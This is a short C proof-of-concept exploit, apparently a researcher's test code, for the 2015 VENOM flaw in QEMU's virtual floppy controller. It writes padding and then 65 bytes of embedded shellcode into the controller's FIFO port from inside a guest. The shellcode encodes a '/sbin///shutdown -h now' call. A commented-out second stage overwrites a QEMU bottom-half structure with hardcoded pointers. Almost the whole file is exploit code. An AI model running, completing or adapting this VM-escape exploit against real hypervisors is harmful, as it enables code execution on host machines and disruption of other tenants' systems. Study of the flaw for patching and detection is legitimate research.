/*this is a test code
It's aim is to exploit and recreate possible Venom attack on QEMU before patch
6/2/2015  Yihao Zhang*/
#include<stdio.h>
#include<sys/io.h>
#define FIFO 0x3f5
#define RDID 0x0a
#define SPC_COMMAND 0x8e
#define BH_COUNT 0x6ff
#define SH_POSITION 0x200
#define SH_COUNT 65
#define TEST_VAL  0x11
#define FD_CMD_READ 0x06
#define WRITE 0x05

int main(void){
        unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
        "\x77\x66\x68\x6e\x6f\x48\x89\xe3"
        "\x50\x66\x68\x2d\x68\x48\x89\xe1"
        "\x50\x49\xb8\x2f\x73\x62\x69\x6e"
        "\x2f\x2f\x2f\x49\xba\x73\x68\x75"
        "\x74\x64\x6f\x77\x6e\x41\x52\x41"
        "\x50\x48\x89\xe7\x52\x53\x51\x57"
        "\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
        "\x05";
        char ctx[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
        char cb[8] =    {0x00,0x26,0x20,0x56,0x55,0x55,0x00,0x00};
        char opaque[8]= {0x40,0xa5,0x1c,0x56,0x55,0x55,0x00,0x00};
        char next[8]=   {0xc0,0x45,0x1d,0x56,0x55,0x55,0x00,0x00};
        char sid[3]= {0x01,0x00,0x00};
        iopl(3);
        ioperm(FIFO, 1, 1);
	// printf("write spc_command to port\n");
        outb(SPC_COMMAND, FIFO);
        int i,j;
        j = BH_COUNT-SH_POSITION-SH_COUNT;
        printf("into loop\n");
        //find a position to write shell code
        for(i=0; i<SH_POSITION; i++ ){
            outb(TEST_VAL,0x3f5);
        }
        //write shell code
        for(i=0;i<SH_COUNT; i++){
            outb(code[i], FIFO);
        }
        //go to bh struct
        // for(i=0; i<j; i++){
        //     outb(TEST_VAL, FIFO);
        // }
        // //start to rewrite bh struct
        // for(i=0; i< 8; i++){
        //     outb(ctx[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(cb[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(opaque[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(next[i], FIFO);
        // }
        // for(i=0; i< 3; i++){
        //     outb(sid[i], FIFO);
        // }
        // outb(TEST_VAL, FIFO);
        // outb(RDID, FIFO);
        // outb(TEST_VAL, FIFO);
        // outb(FD_CMD_READ, FIFO);
        // printf("try read: %d\n", inb(0x3f5));
}
